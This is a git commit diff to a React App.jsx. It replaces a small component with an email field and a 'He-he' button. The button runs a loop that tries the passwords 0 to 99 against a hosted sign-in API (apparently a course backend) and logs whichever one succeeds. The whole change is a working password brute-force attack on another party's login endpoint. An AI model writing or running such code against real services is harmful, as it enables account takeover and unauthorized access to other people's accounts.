3f830c7cdace2d4c2db7d34e4b5599bcd93ccaed
vinnipuhl <whowhowholin@gmail.com>
2022-04-06 12:43:15 +0300

    )

--- src/App.jsx
+++ src/App.jsx
@@ -1,13 +1,53 @@
 import React, { useEffect, useState } from 'react';
-import RequestIdentity from './components/fetch.jsx';
 import './App.css';
 
+
 export default function App() {
+  const [email, setEmail] = useState('');
+
+  function handleSub(email){
+    console.log(email);
+    for(let section = 0; section <= 99; section++){
+      const password = section.toString();
+      fetch('https://tms-js-pro-back-end.herokuapp.com/api/users/signin', {
+        method: 'POST',
+        headers: {
+          Accept: 'application/json',
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({email, password})
+      })
+      .then((response) => {
+        if(response.ok){
+          console.log(`Your password is: ${password.padStart(2, "0")}`)
+        }
+      })
+      .catch((err) => {
+        console.log(err.name)
+      })
+    }
+  }
+
   return (
     <div className='center'>
-      <div>
-        <p className='center text-params'>DOGS</p>
-        <RequestIdentity />
+      <div style={{marginTop: "200px"}}>
+        <input value={email} placeholder='email' 
+          onChange={(e) => {
+            setEmail(e.target.value);
+          }} 
+          style={{
+            width:'200px',
+            height:'20px',
+          }}/>
+          
+        <div>
+          <button onClick={() => {handleSub(email)}} style={{
+            width:'200px',
+            height:'20px',
+            marginTop: "10px",
+            fontSize: '12px'
+          }}>He-he</button>
+        </div>
       </div> 
     </div>
   )
